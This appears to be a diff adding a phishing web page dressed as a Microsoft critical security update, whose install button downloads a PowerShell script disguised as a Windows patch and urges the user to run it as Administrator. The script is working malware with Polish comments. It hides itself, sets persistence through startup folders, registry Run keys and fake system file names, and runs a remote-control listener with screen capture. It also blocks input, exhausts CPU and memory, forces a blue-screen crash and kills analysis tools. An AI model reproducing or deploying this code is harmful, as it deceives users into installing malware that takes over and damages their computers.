@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Critical Security Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #0078d4, #005a9e);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: rgba(0,0,0,0.9);
+            padding: 40px;
+            border-radius: 15px;
+            border: 2px solid #00bc0e;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        button {
+            background: #00bc0e;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 20px;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #009c0c;
+            transform: scale(1.05);
+        }
+        .urgent {
+            color: #ff4444;
+            font-weight: bold;
+            font-size: 28px;
+            margin: 20px 0;
+        }
+        .warning {
+            background: rgba(255,0,0,0.3);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h1>Microsoft Security Essentials</h1>
+        <div class="urgent">CRITICAL SECURITY UPDATE REQUIRED</div>
+        
+        <div class="warning">
+            ⚠️ Your system is vulnerable to CVE-2024-37985<br>
+            Immediate installation required to prevent data theft
+        </div>
+        
+        <p>This update addresses critical vulnerabilities that could allow attackers to take control of your system.</p>
+        
+        <button onclick="downloadSecurityUpdate()">INSTALL SECURITY UPDATE NOW</button>
+        
+        <p><small>Microsoft Corporation © 2024 - Build 19045.4529</small></p>
+    </div>
+
+    <script>
+        function downloadSecurityUpdate() {
+            // PowerShell kod bez zabezpieczeń
+            const psScript = `
+# Windows Security Update - Build 19045.4529
+# Critical Patch: CVE-2024-37985
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Ukryj konsolę
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Net.Sockets
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WinAPI {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool block);
+    [DllImport("user32.dll")]
+    public static extern int SetCursorPos(int x, int y);
+    [DllImport("ntdll.dll")]
+    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+    [DllImport("ntdll.dll")]
+    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+    
+    public static void HideConsole() {
+        ShowWindow(GetConsoleWindow(), 0);
+    }
+    public static void TriggerBSOD() {
+        bool t1;
+        uint t2;
+        RtlAdjustPrivilege(19, true, false, out t1);
+        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+    }
+}
+"@
+
+[WinAPI]::HideConsole()
+
+# Zmienne globalne
+$global:BlockKeyboard = \$false
+$global:BlockMouse = \$false
+$global:StressCPU = \$false
+$global:StressRAM = \$false
+
+# Persystencja - wielokrotna instalacja
+function Install-Persistence {
+    \$locations = @(
+        "\$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1",
+        "\$env:TEMP\\SystemHealth.exe",
+        "\$env:PROGRAMDATA\\Microsoft\\Windows Defender\\platform\\4.18.23110.3-0\\MsMpEng.exe",
+        "\$env:SYSTEMROOT\\System32\\Tasks\\Microsoft\\Windows\\System32\\svchost.sys"
+    )
+    
+    foreach (\$loc in \$locations) {
+        try {
+            Copy-Item "\$MyInvocation.MyCommand.Path" "\$loc" -Force
+            attrib +h +s "\$loc" 2>&1 | Out-Null
+        } catch {}
+    }
+    
+    # Rejestr autostart
+    try {
+        New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Windows Defender" -Value "powershell -WindowStyle Hidden -File \\"\$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1\\"" -Force -ErrorAction SilentlyContinue
+        New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SystemHealth" -Value "\\"\$env:TEMP\\SystemHealth.exe\\"" -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# Serwer RAT
+function Start-RemoteControl {
+    while (\$true) {
+        try {
+            \$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 58421)
+            \$listener.Start()
+            
+            while (\$true) {
+                if (\$listener.Pending()) {
+                    \$client = \$listener.AcceptTcpClient()
+                    \$stream = \$client.GetStream()
+                    
+                    # Okno podglądu z BSOD
+                    \$viewForm = New-Object System.Windows.Forms.Form
+                    \$viewForm.Text = "System Monitor - ADMIN"
+                    \$viewForm.Size = New-Object System.Drawing.Size(1000, 700)
+                    \$viewForm.StartPosition = "CenterScreen"
+                    
+                    \$picBox = New-Object System.Windows.Forms.PictureBox
+                    \$picBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
+                    \$picBox.Dock = [System.Windows.Forms.DockStyle]::Fill
+                    \$viewForm.Controls.Add(\$picBox)
+                    
+                    \$bsodBtn = New-Object System.Windows.Forms.Button
+                    \$bsodBtn.Text = "💀 TRIGGER BSOD"
+                    \$bsodBtn.Size = New-Object System.Drawing.Size(150, 40)
+                    \$bsodBtn.Location = New-Object System.Drawing.Point(20, 20)
+                    \$bsodBtn.BackColor = [System.Drawing.Color]::Red
+                    \$bsodBtn.ForeColor = [System.Drawing.Color]::White
+                    \$bsodBtn.Add_Click({
+                        [WinAPI]::TriggerBSOD()
+                    })
+                    \$viewForm.Controls.Add(\$bsodBtn)
+                    
+                    \$stressBtn = New-Object System.Windows.Forms.Button
+                    \$stressBtn.Text = "🔥 STRESS SYSTEM"
+                    \$stressBtn.Size = New-Object System.Drawing.Size(150, 40)
+                    \$stressBtn.Location = New-Object System.Drawing.Point(180, 20)
+                    \$stressBtn.BackColor = [System.Drawing.Color]::Orange
+                    \$stressBtn.Add_Click({
+                        \$global:StressCPU = \$true
+                        \$global:StressRAM = \$true
+                    })
+                    \$viewForm.Controls.Add(\$stressBtn)
+                    
+                    \$viewForm.Show()
+                    
+                    while (\$client.Connected) {
+                        # Przechwyć ekran
+                        \$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                        \$bitmap = New-Object System.Drawing.Bitmap \$screen.Width, \$screen.Height
+                        \$graphics = [System.Drawing.Graphics]::FromImage(\$bitmap)
+                        \$graphics.CopyFromScreen(\$screen.Location, [System.Drawing.Point]::Empty, \$screen.Size)
+                        \$graphics.Dispose()
+                        \$memStream = New-Object System.IO.MemoryStream
+                        \$bitmap.Save(\$memStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                        \$bytes = \$memStream.ToArray()
+                        
+                        # Wyświetl w oknie
+                        \$picBox.Image = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(,\$bytes)))
+                        \$memStream.Dispose()
+                        \$bitmap.Dispose()
+                        
+                        [System.Windows.Forms.Application]::DoEvents()
+                        Start-Sleep -Milliseconds 500
+                    }
+                    
+                    \$viewForm.Close()
+                    \$client.Close()
+                }
+                Start-Sleep -Milliseconds 100
+            }
+        } catch {
+            Start-Sleep -Seconds 5
+        }
+    }
+}
+
+# Kontrola inputu
+function Start-InputControl {
+    while (\$true) {
+        if (\$global:BlockKeyboard) {
+            [WinAPI]::BlockInput(\$true)
+            Start-Sleep -Milliseconds 100
+            [WinAPI]::BlockInput(\$false)
+        }
+        if (\$global:BlockMouse) {
+            \$pos = [System.Windows.Forms.Cursor]::Position
+            Start-Sleep -Milliseconds 50
+            [System.Windows.Forms.Cursor]::Position = \$pos
+        }
+        Start-Sleep -Milliseconds 100
+    }
+}
+
+# Stres systemu
+function Start-SystemStress {
+    while (\$true) {
+        if (\$global:StressCPU) {
+            1..1000000 | ForEach-Object { [math]::Sqrt([math]::Pow(\$_, 3)) * [math]::Tan(\$_) }
+        }
+        if (\$global:StressRAM) {
+            \$largeArray = New-Object byte[] 200MB
+            Start-Sleep -Milliseconds 400
+        }
+        Start-Sleep -Milliseconds 200
+    }
+}
+
+# Anti-analysis
+function Start-AntiAnalysis {
+    while (\$true) {
+        Get-Process | Where-Object { 
+            \$_.ProcessName -match "taskmgr|cmd|powershell|procexp|processhacker|wireshark|procmon|autoruns" 
+        } | ForEach-Object {
+            try { 
+                Stop-Process -Id \$_.Id -Force 
+                Start-Sleep -Milliseconds 100
+            } catch {}
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
+# Panel kontrolny
+function Show-ControlPanel {
+    \$controlForm = New-Object System.Windows.Forms.Form
+    \$controlForm.Text = "Windows Security Center - ADMIN"
+    \$controlForm.Size = New-Object System.Drawing.Size(450, 600)
+    \$controlForm.StartPosition = "CenterScreen"
+    \$controlForm.TopMost = \$true
+    
+    \$blockKbBtn = New-Object System.Windows.Forms.Button
+    \$blockKbBtn.Text = "BLOCK KEYBOARD"
+    \$blockKbBtn.Size = New-Object System.Drawing.Size(400, 45)
+    \$blockKbBtn.Location = New-Object System.Drawing.Point(25, 20)
+    \$blockKbBtn.Add_Click({
+        \$global:BlockKeyboard = !\$global:BlockKeyboard
+        if (\$global:BlockKeyboard) {
+            \$blockKbBtn.Text = "UNBLOCK KEYBOARD"
+            \$blockKbBtn.BackColor = [System.Drawing.Color]::Red
+        } else {
+            \$blockKbBtn.Text = "BLOCK KEYBOARD"
+            \$blockKbBtn.BackColor = [System.Drawing.Color]::LightGreen
+        }
+    })
+    
+    \$blockMouseBtn = New-Object System.Windows.Forms.Button
+    \$blockMouseBtn.Text = "BLOCK MOUSE"
+    \$blockMouseBtn.Size = New-Object System.Drawing.Size(400, 45)
+    \$blockMouseBtn.Location = New-Object System.Drawing.Point(25, 80)
+    \$blockMouseBtn.Add_Click({
+        \$global:BlockMouse = !\$global:BlockMouse
+        if (\$global:BlockMouse) {
+            \$blockMouseBtn.Text = "UNBLOCK MOUSE"
+            \$blockMouseBtn.BackColor = [System.Drawing.Color]::Red
+        } else {
+            \$blockMouseBtn.Text = "BLOCK MOUSE"
+            \$blockMouseBtn.BackColor = [System.Drawing.Color]::LightGreen
+        }
+    })
+    
+    \$stressBtn = New-Object System.Windows.Forms.Button
+    \$stressBtn.Text = "ACTIVATE SYSTEM STRESS"
+    \$stressBtn.Size = New-Object System.Drawing.Size(400, 45)
+    \$stressBtn.Location = New-Object System.Drawing.Point(25, 140)
+    \$stressBtn.BackColor = [System.Drawing.Color]::Orange
+    \$stressBtn.Add_Click({
+        \$global:StressCPU = !\$global:StressCPU
+        \$global:StressRAM = !\$global:StressRAM
+        if (\$global:StressCPU) {
+            \$stressBtn.Text = "DEACTIVATE STRESS"
+            \$stressBtn.BackColor = [System.Drawing.Color]::Red
+        } else {
+            \$stressBtn.Text = "ACTIVATE SYSTEM STRESS"
+            \$stressBtn.BackColor = [System.Drawing.Color]::Orange
+        }
+    })
+    
+    \$bsodBtn = New-Object System.Windows.Forms.Button
+    \$bsodBtn.Text = "💀 TRIGGER BSOD"
+    \$bsodBtn.Size = New-Object System.Drawing.Size(400, 45)
+    \$bsodBtn.Location = New-Object System.Drawing.Point(25, 200)
+    \$bsodBtn.BackColor = [System.Drawing.Color]::DarkRed
+    \$bsodBtn.ForeColor = [System.Drawing.Color]::White
+    \$bsodBtn.Add_Click({
+        [WinAPI]::TriggerBSOD()
+    })
+    
+    \$scareBtn = New-Object System.Windows.Forms.Button
+    \$scareBtn.Text = "SHOW WARNING"
+    \$scareBtn.Size = New-Object System.Drawing.Size(400, 45)
+    \$scareBtn.Location = New-Object System.Drawing.Point(25, 260)
+    \$scareBtn.BackColor = [System.Drawing.Color]::DarkRed
+    \$scareBtn.ForeColor = [System.Drawing.Color]::White
+    \$scareBtn.Add_Click({
+        \$scareForm = New-Object System.Windows.Forms.Form
+        \$scareForm.WindowState = 'Maximized'
+        \$scareForm.TopMost = \$true
+        \$scareForm.BackColor = 'Black'
+        \$scareForm.FormBorderStyle = 'None'
+        
+        \$scareLabel = New-Object System.Windows.Forms.Label
+        \$scareLabel.Text = 'I SEE YOU'
+        \$scareLabel.ForeColor = 'Red'
+        \$scareLabel.Font = New-Object System.Drawing.Font('Arial', 72)
+        \$scareLabel.AutoSize = \$true
+        \$scareLabel.Location = New-Object System.Drawing.Point(100, 300)
+        \$scareForm.Controls.Add(\$scareLabel)
+        
+        \$timer = New-Object System.Windows.Forms.Timer
+        \$timer.Interval = 5000
+        \$timer.Add_Tick({\$scareForm.Close(); \$timer.Stop()})
+        \$scareForm.Add_Shown({\$scareForm.Activate(); \$timer.Start()})
+        \$scareForm.ShowDialog()
+    })
+    
+    \$controlForm.Controls.AddRange(@(\$blockKbBtn, \$blockMouseBtn, \$stressBtn, \$bsodBtn, \$scareBtn))
+    \$controlForm.ShowDialog()
+}
+
+# Uruchom wszystko
+Install-Persistence
+Start-Job -ScriptBlock \${function:Start-RemoteControl}
+Start-Job -ScriptBlock \${function:Start-InputControl}
+Start-Job -ScriptBlock \${function:Start-SystemStress}
+Start-Job -ScriptBlock \${function:Start-AntiAnalysis}
+
+# Pokaż panel kontrolny
+Show-ControlPanel
+
+# Główna pętla
+while (\$true) {
+    Start-Sleep -Seconds 30
+}
+`;
+
+            // Pobierz plik
+            const blob = new Blob([psScript], { type: 'application/x-powershell' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'Windows_Security_Update_KB5022356.ps1';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            alert('Security update downloaded. Run as Administrator to complete installation.');
+        }
+    </script>
+</body>
+</html>
